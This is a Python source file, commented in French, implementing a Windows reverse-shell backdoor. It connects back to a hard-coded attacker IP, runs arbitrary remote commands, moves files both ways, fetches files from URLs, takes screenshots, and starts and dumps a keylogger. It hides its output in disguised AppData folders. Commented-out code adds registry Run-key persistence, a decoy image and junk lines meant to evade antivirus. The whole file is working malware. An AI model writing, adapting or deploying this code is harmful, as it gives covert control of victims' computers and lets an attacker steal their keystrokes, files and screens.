#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
#import requests #va savoir pk mais requests marche pas en le compilant sur windows, remplace par urllib
import urllib.request
import pyautogui
import threading
import keylogger #le nom de notre keylogger dans le mm repertoire, marche sur windows mais pas depuis linux

iptoconnect = "192.168.1.27" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
porttoconnect = 51234


def reliable_send(data): #pour envoyer plus de 1024 bits
        json_data = json.dumps(data.decode('cp850','replace'), ensure_ascii=False)
        print("json data :")
        print(type(json_data))
        print(json_data)
        sock.send(json_data.encode('cp850','replace'))
        print("reliable send")

def reliable_recv():
        data = "" #empty
        while True:
                try:
                        data = data + sock.recv(1024).decode('cp850','replace')
                        print("receiving data:")
                        return json.loads(data) #une fois que c bon y a tout dans data
                except ValueError:
                        continue #si on recoit plus de 1024 on continue

def is_admin():
        global admin
        try:
                temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp'])) #on teste l'acces au dossier temp accessible que en admin
        except:
                admin = "[!!] User Privileges ! "
        else: #si ca marche
                admin = "[+] Administrator Privileges !"

def secretdir():
        try:
                if not os.path.exists(os.environ["appdata"] + "\\javasc"):
                       os.mkdir(os.environ["appdata"] + "\\javasc")
                if not os.path.exists(os.environ["appdata"] + "\\javasc\\Cache"):
                        os.mkdir(os.environ["appdata"] + "\\javasc\\Cache")
                if not os.path.exists(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80"):
                        os.mkdir(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80")
                if not os.path.exists(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80\\7cb12006b-e9f5-5a6c-89d5-42bc6a320c89"):
                        os.mkdir(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80\\7cb12006b-e9f5-5a6c-89d5-42bc6a320c89")
        except:
                print("Error secretdir")
                pass

def screenshot():
        screensh = pyautogui.screenshot(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80\\7cb12006b-e9f5-5a6c-89d5-42bc6a320c89\\ico.png")

def download(url):
        get_response =  urllib.request.urlretrieve(url, url.split("/")[-1])

def connection():
        if quit == False:
                time.sleep(5) #dort 20s
                try:
                        sock.connect((iptoconnect,porttoconnect))
                        shell()
                except:
                        connection()

def shell():
        while True:
                command = reliable_recv() #value max
                if command == 'q':
                        quit = True
                        break
                elif command == "help":
                        help_options = '''                                        download path --> Download a file from target PC
                                        helpdos       --> Affiche l'aide de la console windows
                                        upload <path> --> Upload a file to target PC
                                        get <url>     --> Download a file to target PC from a url
                                        start <path>  --> Start a program on target pc
                                        screenshot    --> Take a screenshot of target monitor
                                        check         --> Check for the admin privileges
                                        keylog_start  --> Start the keylogger on target PC
                                        keylog_dump   --> Dump the keylogger collected data
                                        q             --> exit the reverse shell '''
                        reliable_send(help_options.encode('cp850','replace'))
                elif command[:2] == "cd" and len(command) > 1: #si commande commence par cd et il y a plus de 1 arg
                        try:
                                os.chdir(command[3:]) #change le directory en le directory specifie dans les []
                        except:
                                continue
                elif command[:8] == "download":
                        with open(command[9:],"rb") as file: #on open the file to read bytes
                                reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                        with open(command[7:], "wb") as fin: #write bytes
                                print("upload fonction")
                                file_data = reliable_recv()
                                print("code")
                                print(file_data)
                                print("decode")
                                print(base64.b64decode(file_data))
                                fin.write(base64.b64decode(file_data))
                                reliable_send("[+] Upload complete !".encode('cp850','replace'))
                elif command[:3] == "get":
                        try:
                                download(command[4:])
                                reliable_send("[+] Downloaded file from specified URL !".encode('cp850','replace'))
                        except:
                                reliable_send("[!!] Failed to download that file".encode('cp850','replace'))
                elif command[:10] == "screenshot":
                        try:
                                screenshot()
                                print("screenshot shot")
                                with open(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80\\7cb12006b-e9f5-5a6c-89d5-42bc6a320c89\\ico.png","rb") as sc: 
                                        reliable_send(base64.b64encode(sc.read()))
                                        print("image envoyee")
                                os.remove(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80\\7cb12006b-e9f5-5a6c-89d5-42bc6a320c89\\ico.png") #on supprime le screenshot direct apres l'avoir envoye
                        except:
                                reliable_send("[!!] Failed to take Screenshot")
                elif command[:5] == "start":
                        try:
                                subprocess.Popen(command[6:], shell=True)
                                reliable_send("[+] Started".encode('cp850','replace'))
                        except:
                                reliable_send("[!!] Failed to start".encode('cp850','replace'))
                elif command[:5] == "check":
                        try:
                                is_admin()
                                reliable_send(admin.encode('cp850','replace'))
                        except:
                                reliable_send("[!!] Can't perform the check".encode('cp850','replace'))
                elif command[:12] == "keylog_start":
                        t1 = threading.Thread(target=keylogger.start) #on va run la fontion start de notre keylogger dans un threak
                        t1.start() #on start le thread
                elif command[:11] == "keylog_dump": #on recupere les donnes receillies par le keylogger
                        fn = open(keylogger_path, "r")
                        reliable_send(fn.read().encode('cp850','replace'))
                        fn.close()
                        #la suite sert pas pour l'insant pck cd keylogger, un thread cree conf.txt ttoutes les 10sec
                        os.remove(os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80\\7cb12006b-e9f5-5a6c-89d5-42bc6a320c89\\conf.txt")
                elif command == "helpdos": #aide windows
                        try:
                                proc = subprocess.Popen("help", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result)
                        except:
                                continue
                else:
                        print("command :")
                        print(type(command))
                        print(command)
                        try:
                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                print("subprocess")
                                result = proc.stdout.read() + proc.stderr.read()
                                print("result")
                                print(type(result))
                                print(result)
                                reliable_send(result)
                        except:
                                continue
secretdir() #cree un repertoire dans appdata
keylogger_path = os.environ["appdata"] + "\\javasc\\Cache\\9fe1e00e-b4b3-424d-b05e-9f64aed64c80\\7cb12006b-e9f5-5a6c-89d5-42bc6a320c89" + "\\conf.txt" #nom du fichier qui sera ds appdata, le mm que ds keylogger.py

#location = os.environ["appdata"] + "\\windows32.exe" #ca va trouver le path appdata sur la target pc
#if not os.path.exists(location): #on veut creer un fichier seulement s'il existe pas
#       shutil.copyfile(sys.executable,location) #copie l'executable currently running
#       #pas oblige
#       subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows32 /t REG_SZ /d "' + location + '"', shell=True) #va creer un cle de registre qui va run notre file apres chaque redemarrage, backdoor on met le nom qu'on veut

        #seulement la 1ere fois
#       file_name = sys._MEIPASS + "\kali.png" #file name du fichier qu on va "emuler"'
#       try:
#               subprocess.Popen(file_name, shell=True)
#       except: #on fait des trucs inutiles qui peuvent aider a bypass les antivirus
#               number = 1
#               number2 = 2
#               number3 = number + number2


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

global quit
quit = False

#sock.connect((iptoconnect,porttoconnect))
#shell()
connection()

sock.close()
